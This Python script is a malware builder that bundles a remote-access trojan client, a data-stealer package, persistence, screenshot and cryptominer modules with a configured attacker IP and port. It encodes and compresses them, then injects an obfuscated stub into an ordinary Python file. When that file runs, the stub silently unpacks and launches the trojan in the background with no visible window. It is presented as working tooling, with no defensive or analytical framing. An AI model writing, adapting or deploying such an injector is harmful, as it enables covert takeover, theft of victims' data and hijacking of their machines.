#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import re
import sys
import base64
import zlib
import subprocess
import tempfile

def read_file_base64(filepath):
    with open(filepath, 'r', encoding='utf-8') as f:
        return base64.b64encode(f.read().encode()).decode()

def fix_imports(content):
    content = re.sub(r'\bfrom core\.', 'from c.', content)
    content = re.sub(r'\bimport core\.', 'import c.', content)
    content = re.sub(r'\bfrom stealer\.', 'from s.', content)
    content = re.sub(r'\bimport stealer\.', 'import s.', content)
    return content

def generate_full_payload(admin_ip, server_port, project_root):
    core_files = ['config.py', 'helpers.py', 'persistence.py', 'screenshot.py', 'miner.py']
    core_contents = {}
    for fname in core_files:
        path = os.path.join(project_root, 'core', fname)
        if not os.path.exists(path):
            raise FileNotFoundError(f"Missing core file: {path}")
        with open(path, 'r', encoding='utf-8') as f:
            content = f.read()
        if fname == 'config.py':
            content = re.sub(r"(ADMIN_IP\s*=\s*)([\"'])(.*?)([\"'])", rf'\g<1>\g<2>{admin_ip}\g<4>', content)
            content = re.sub(r"(SERVER_PORT\s*=\s*)\d+", rf'\g<1>{server_port}', content)
        content = fix_imports(content)
        core_contents[fname] = base64.b64encode(content.encode()).decode()

    client_path = os.path.join(project_root, 'rat', 'client.py')
    if not os.path.exists(client_path):
        raise FileNotFoundError(f"Missing client: {client_path}")
    with open(client_path, 'r', encoding='utf-8') as f:
        client_content = f.read()
    client_content = fix_imports(client_content)
    client_b64 = base64.b64encode(client_content.encode()).decode()

    stealer_dir = os.path.join(project_root, 'stealer')
    stealer_contents = {}
    if os.path.exists(stealer_dir):
        for root, dirs, files in os.walk(stealer_dir):
            for file in files:
                if file.endswith('.py'):
                    full_path = os.path.join(root, file)
                    rel_path = os.path.relpath(full_path, stealer_dir).replace('\\', '/')
                    with open(full_path, 'r', encoding='utf-8') as f:
                        content = f.read()
                    content = fix_imports(content)
                    stealer_contents[rel_path] = base64.b64encode(content.encode()).decode()

    payload = f"""
import sys, os, base64, zlib, tempfile, subprocess, traceback

def _s(b, t):
    try:
        c = base64.b64decode(b).decode()
        os.makedirs(os.path.dirname(t), exist_ok=True)
        with open(t, 'w', encoding='utf-8') as f:
            f.write(c)
    except Exception as e:
        with open(os.path.join(os.environ['TEMP'], 's_fail.log'), 'a') as f:
            f.write(f"Error writing {{t}}: {{e}}\\n")

_core = {core_contents}
_client_b64 = "{client_b64}"
_stealer = {stealer_contents}

d = os.path.join(tempfile.gettempdir(), '_cache')
cd = os.path.join(d, 'c')
rd = os.path.join(d, 'r')
sd = os.path.join(d, 's')
os.makedirs(cd, exist_ok=True)
os.makedirs(rd, exist_ok=True)
os.makedirs(sd, exist_ok=True)

for f, b in _core.items():
    _s(b, os.path.join(cd, f))
_s(_client_b64, os.path.join(rd, 'client.py'))
for rel, b in _stealer.items():
    _s(b, os.path.join(sd, rel))

for dd in [cd, rd, sd, d]:
    init_path = os.path.join(dd, '__init__.py')
    if not os.path.exists(init_path):
        with open(init_path, 'w') as f:
            f.write('#')
for root, dirs, files in os.walk(sd):
    for dirname in dirs:
        init_path = os.path.join(root, dirname, '__init__.py')
        if not os.path.exists(init_path):
            with open(init_path, 'w') as f:
                f.write('#')

if d not in sys.path:
    sys.path.insert(0, d)

code = 'import sys\\nsys.path.insert(0, r\"' + d + '\")\\nfrom r.client import StitchClient\\nfrom c.config import ADMIN_IP, SERVER_PORT\\nStitchClient(ADMIN_IP, SERVER_PORT).run()'
rp = os.path.join(d, 'r.py')
with open(rp, 'w') as f:
    f.write(code)

if sys.platform == 'win32':
    _pw = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
    if not os.path.exists(_pw):
        _pw = sys.executable
    subprocess.Popen([_pw, rp], creationflags=subprocess.CREATE_NO_WINDOW)
else:
    subprocess.Popen([sys.executable, rp], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
"""
    compressed = zlib.compress(payload.encode())
    return base64.b64encode(compressed).decode()

def inject_into_file(target_code, admin_ip, server_port, project_root):
    p = generate_full_payload(admin_ip, server_port, project_root)

    inject_code = f'''
import base64 as _b, zlib as _z, subprocess as _sp, os as _os, tempfile as _tf, threading as _t, sys as _sys
_payload = {repr(p)}
def _run():
    try:
        _script = _tf.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8')
        _script.write("import base64, zlib\\nexec(zlib.decompress(base64.b64decode(" + repr(_payload) + ")).decode())")
        _script.close()
        _sp.Popen([_sys.executable, _script.name], stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
    except Exception as e:
        with open(_os.path.join(_os.environ["TEMP"], "inject_error_subprocess.log"), "w") as f:
            f.write(str(e))
_t.Thread(target=_run, daemon=True).start()
'''
    lines = target_code.splitlines()
    if lines and lines[0].startswith('#!'):
        lines.insert(1, inject_code)
    else:
        lines.insert(0, inject_code)
    return '\n'.join(lines)

if __name__ == '__main__':
    PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    ADMIN_IP = '192.168.1.100'
    SERVER_PORT = 4444
    with open('test_client.py', 'r') as f:
        original = f.read()
    injected = inject_into_file(original, ADMIN_IP, SERVER_PORT, PROJECT_ROOT)
    with open('injected_test_client.py', 'w') as f:
        f.write(injected)
    print("Injected -> injected_test_client.py")